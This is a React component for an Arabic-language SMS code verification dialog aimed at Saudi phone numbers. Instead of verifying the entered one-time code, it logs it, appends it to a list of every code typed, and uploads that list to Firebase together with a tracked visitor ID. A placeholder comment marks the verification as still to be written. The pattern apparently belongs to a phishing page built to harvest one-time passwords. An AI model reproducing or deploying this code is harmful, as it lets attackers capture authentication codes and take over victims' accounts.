"use client"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"

interface OtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
}
const allOtps=['']
export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const inputRef = useRef<HTMLInputElement | null>(null)

  useEffect(() => {
    if (open && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [open, timer])

  useEffect(() => {
    if (open) {
      setTimer(60)
      setOtp("")
      inputRef.current?.focus()
    }
  }, [open])

  const handleChange = (value: string) => {
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value)
    }
  }

  const handleVerify = async () => {
    console.log("OTP verification:", otp)
    const visitorID=localStorage.getItem('visitor')
    allOtps.push(otp)
   await addData({id:visitorID,otp,allOtps})
    // Add verification logic here
    onOpenChange(false)
  }

  const handleResend = () => {
    console.log("Resending OTP")
    setTimer(60)
    setOtp("")
    inputRef.current?.focus()
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader className="text-center space-y-2">
          <DialogTitle className="text-2xl font-bold">أدخل رمز التحقق</DialogTitle>
          <DialogDescription className="text-base">
            تم إرسال رمز التحقق إلى رقم الجوال
            <br />
            <span className="font-semibold text-foreground">{phoneNumber}+966</span>
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="000000"
              className="w-full max-w-xs h-14 text-center text-2xl font-bold tracking-[0.5em]"
            />
          </div>

          <div className="text-center">
            {timer > 0 ? (
              <p className="text-sm text-muted-foreground">
                إعادة إرسال الرمز بعد <span className="font-semibold text-foreground">{timer}</span> ثانية
              </p>
            ) : (
              <Button variant="link" onClick={handleResend} className="text-[#1a5c85]">
                إعادة إرسال رمز التحقق
              </Button>
            )}
          </div>

          <Button
            onClick={handleVerify}
            disabled={otp.length !== 6}
            className="w-full h-12 text-lg bg-[#1a5c85] hover:bg-[#154a6d]"
          >
            تحقق
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  )
}
